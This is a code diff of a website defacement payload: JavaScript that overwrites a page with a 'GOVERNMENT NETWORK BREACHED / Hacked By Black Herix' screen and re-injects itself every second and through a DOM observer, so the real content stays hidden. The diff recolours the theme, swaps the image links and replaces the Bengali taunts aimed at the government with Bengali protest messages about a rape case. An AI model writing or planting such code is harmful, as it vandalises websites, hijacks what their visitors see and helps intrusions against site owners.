@@ -9,7 +9,7 @@
     <style>
         :root {
             --red: #ff0000;
-            --green: #00ff00;
+            --green: #ff0000;   /* সবুজকে লাল করে পুরো থিম লাল-কালো ভয়ানক রূপ */
             --dark: #000000;
         }
 
@@ -24,7 +24,6 @@
             cursor: crosshair;
         }
 
-        /* ওভারলে ইফেক্ট */
         .crt-scanlines {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             pointer-events: none; z-index: 999999; opacity: 0.2;
@@ -71,7 +70,6 @@
             display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
         }
 
-        /* টাইটেল ব্যানার */
         .alert-banner {
             border: 2px solid var(--red); background: rgba(20,0,0,0.9); padding: 10px 16px;
             margin-bottom: 25px; font-weight: bold; font-size: 0.8rem; letter-spacing: 2px;
@@ -79,7 +77,6 @@
             animation: blink 2s infinite;
         }
 
-        /* গ্লিচি ইমেজ কন্টেইনার */
         .glitch-img-container {
             position: relative; display: inline-block; margin: 20px 0 30px;
             width: 160px; height: 160px;
@@ -94,12 +91,12 @@
             background: inherit; opacity: 0.6; mix-blend-mode: screen;
         }
         .glitch-img-container::before {
-            background: url('https://i.ibb.co/ccrjKJh5/1000021966.jpg') center/cover;
+            background: url('https://i.ibb.co/sp3450B5/1000024127.jpg') center/cover;
             clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0);
             animation: glitchRed 3s infinite; filter: hue-rotate(300deg) saturate(3);
         }
         .glitch-img-container::after {
-            background: url('https://i.ibb.co/ccrjKJh5/1000021966.jpg') center/cover;
+            background: url('https://i.ibb.co/sp3450B5/1000024127.jpg') center/cover;
             clip-path: inset(50% 0 10% 0); transform: translate(3px, 0);
             animation: glitchGreen 3s infinite; filter: hue-rotate(100deg) saturate(3);
         }
@@ -118,25 +115,23 @@
             80% { clip-path: inset(45% 0 5% 0); transform: translate(2px, 1px); }
         }
 
-        /* মেইন টাইটেল */
         .hacker-title {
             font-size: 2rem; font-weight: 900; color: #fff;
-            text-shadow: 0 0 10px var(--red), 0 0 20px var(--green), 2px 2px 0 var(--red);
+            text-shadow: 0 0 10px var(--red), 0 0 20px var(--red), 2px 2px 0 var(--red);
             margin-bottom: 20px; letter-spacing: 2px;
             animation: textFlicker 2s infinite;
         }
         @keyframes textFlicker {
             0%, 100% { opacity: 1; }
-            40% { opacity: 0.9; text-shadow: 0 0 15px var(--green), 0 0 25px var(--red); }
+            40% { opacity: 0.9; text-shadow: 0 0 15px var(--red), 0 0 25px var(--red); }
             60% { opacity: 1; }
             80% { opacity: 0.8; text-shadow: 0 0 5px var(--red); }
         }
 
-        /* ভাসমান মেসেজ কন্টেইনার */
         .floating-messages {
             max-width: 600px; width: 100%; margin: 15px 0 25px;
-            overflow: hidden; position: relative; height: 180px; /* নির্দিষ্ট উচ্চতা */
-            border-top: 1px solid var(--red); border-bottom: 1px solid var(--green);
+            overflow: hidden; position: relative; height: 180px;
+            border-top: 1px solid var(--red); border-bottom: 1px solid var(--red);
             background: rgba(10,0,0,0.5);
             padding: 10px 0;
         }
@@ -149,24 +144,26 @@
         }
         .msg-item {
             padding: 8px 12px; font-size: 0.9rem; font-weight: bold;
-            color: var(--green); text-shadow: 0 0 6px var(--green);
+            color: var(--red); text-shadow: 0 0 6px var(--red);
             border-left: 3px solid var(--red); margin: 10px 0; text-align: left;
-            background: rgba(0,10,0,0.3);
+            background: rgba(30,0,0,0.3);
         }
-        .msg-item.red { color: var(--red); text-shadow: 0 0 6px var(--red); border-left-color: var(--green); }
+        .msg-item.alt {
+            color: #ff4444;
+            border-left-color: #ff4444;
+        }
 
-        /* আল্টিমেটাম */
         .ultimatum {
-            border: 2px dashed var(--green); background: rgba(0,10,0,0.7); padding: 18px 10px;
+            border: 2px dashed var(--red); background: rgba(20,0,0,0.7); padding: 18px 10px;
             max-width: 600px; width: 100%; margin: 20px 0; color: var(--red); font-weight: bold;
             text-shadow: 0 0 8px var(--red); letter-spacing: 1px; line-height: 1.6;
-            box-shadow: 0 0 25px rgba(0,255,0,0.3); position: relative;
+            box-shadow: 0 0 25px rgba(255,0,0,0.3); position: relative;
         }
         .ultimatum::before {
             content: "⛔ সতর্কতা ⛔"; position: absolute; top: -14px; left: 50%;
             transform: translateX(-50%); background: #000; padding: 2px 14px;
-            color: var(--green); font-size: 0.7rem; letter-spacing: 2px;
-            border: 1px solid var(--green); text-shadow: 0 0 6px var(--green);
+            color: var(--red); font-size: 0.7rem; letter-spacing: 2px;
+            border: 1px solid var(--red); text-shadow: 0 0 6px var(--red);
         }
 
         .click-hint {
@@ -176,7 +173,7 @@
 
         .status-bar {
             margin-top: 20px; display: flex; flex-wrap: wrap; justify-content: center;
-            gap: 10px; font-size: 0.6rem; color: var(--green); letter-spacing: 1px;
+            gap: 10px; font-size: 0.6rem; color: var(--red); letter-spacing: 1px;
             border-top: 1px solid var(--red); padding-top: 15px;
         }
         .status-bar span { background: rgba(255,0,0,0.1); padding: 3px 10px; border-radius: 2px; }
@@ -205,28 +202,14 @@
     <div class="wrapper">
         <div class="alert-banner">!!! GOVERNMENT NETWORK BREACHED !!!</div>
 
-        <!-- গ্লিচি প্রোফাইল ইমেজ -->
         <div class="glitch-img-container">
-            <img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Target">
+            <img src="https://i.ibb.co/sp3450B5/1000024127.jpg" alt="Target">
         </div>
 
         <h1 class="hacker-title">Hacked By Black Herix</h1>
 
-        <!-- ভাসমান মেসেজ -->
         <div class="floating-messages">
-            <div class="msg-scroll">
-                <div class="msg-item">সরকার, আপনার সিস্টেমে আমরা ঢুকেছি।</div>
-                <div class="msg-item red">ফায়ারওয়াল? ভেঙে চুরমার।</div>
-                <div class="msg-item">আপনার নিরাপত্তা ব্যবস্থা কাগজের বেড়া মাত্র।</div>
-                <div class="msg-item red">আমরা যেকোনো সময়, যেকোনো ডাটা নিতে পারি।</div>
-                <div class="msg-item">এটা সাইবার জগতের বাস্তবতা দেখানোর ছোট্ট নমুনা।</div>
-                <div class="msg-item red">অবহেলা করলে পরিণতি ভয়াবহ হবে।</div>
-                <div class="msg-item">আপনার ডিজিটাল দেয়ালগুলো আর মজবুত করুন।</div>
-                <div class="msg-item red">আমরা বারবার ফিরে আসব – প্রস্তুত থাকুন।</div>
-                <!-- আবার লুপের জন্য কপি -->
-                <div class="msg-item">সরকার, আপনার সিস্টেমে আমরা ঢুকেছি।</div>
-                <div class="msg-item red">ফায়ারওয়াল? ভেঙে চুরমার।</div>
-            </div>
+            <div class="msg-scroll" id="msg-scroll"></div>
         </div>
 
         <div class="ultimatum">
@@ -246,14 +229,40 @@
 </html>
 `;
 
-    // ডম ওভাররাইট ইঞ্জিন (অপরিবর্তিত)
+    // ইনজেক্ট ও স্টার্ট ইফেক্ট
     function injectDeface() {
         if (document.documentElement.innerHTML !== defaceHTML) {
             document.open();
             document.write(defaceHTML);
             document.close();
             startEffects();
+            fillMessages(); // মেসেজ পূরণ
         }
+    }
+
+    // মেসেজের তালিকা
+    function fillMessages() {
+        const container = document.getElementById('msg-scroll');
+        if (!container) return;
+        const messages = [
+            "তো কেয়া হাল হে ভাইলোগ",
+            "আবারো একটি নিশংস ধর্ষণের বিচারের জন্য মাঠে নামলাম 😅",
+            "আগেরবার মুখোশ পরা ছিল এবার আর কোন মুখোশ নাই আমার প্রিয় সরকার 😘",
+            "এই নিশংসতার ও সঠিক বিচার চাই রামিসা হত্যার বিচারের মত",
+            "নয়তো আগেরবারের চাইতেও এবারকার সাইবার প্রতিবাদ অনেক ভয়ানক হবে",
+            "পারলে থামায়েন আর না হয় সঠিক বিচার করিয়েন",
+            "মির্জাপুর সাইবার টিম সব সময় সত্যের পথে আছি",
+            "এবং ইনশাল্লাহ সারা জীবন থাকবো",
+            "আল্লাহ হাফেজ"
+        ];
+        let html = '';
+        // লুপ করে আইটেম তৈরি, বারবার স্ক্রোলের জন্য কয়েকবার রিপিট
+        for (let i = 0; i < 3; i++) {
+            messages.forEach((msg, idx) => {
+                html += `<div class="msg-item${idx % 2 === 0 ? '' : ' alt'}">${msg}</div>`;
+            });
+        }
+        container.innerHTML = html;
     }
 
     function startEffects() {
@@ -280,7 +289,7 @@
             lastTime = timestamp;
             ctx.fillStyle = 'rgba(0, 0, 0, 0.12)';
             ctx.fillRect(0, 0, width, height);
-            ctx.fillStyle = '#ff0000'; // রেড ম্যাট্রিক্স রেইন
+            ctx.fillStyle = '#ff0000';
             ctx.font = fontSize + 'px monospace';
             for (let i = 0; i < drops.length; i++) {
                 const char = String.fromCharCode(0x30A0 + Math.random() * 96);
@@ -293,7 +302,6 @@
         resizeMatrix();
         requestAnimationFrame(drawMatrix);
 
-        // পার্টিকেল জেনারেটর (লাল সিম্বল)
         const container = document.getElementById('particles-container');
         const symbols = ['☠', '⚠', '✖', '⬤'];
         setInterval(() => {
@@ -308,7 +316,7 @@
         }, 2800);
     }
 
-    // অটো-ইনজেকশন ও লক
+    // অটো-ইনজেকশন ও পুনরায় লক
     injectDeface();
     setInterval(injectDeface, 1000);
     const observer = new MutationObserver(injectDeface);
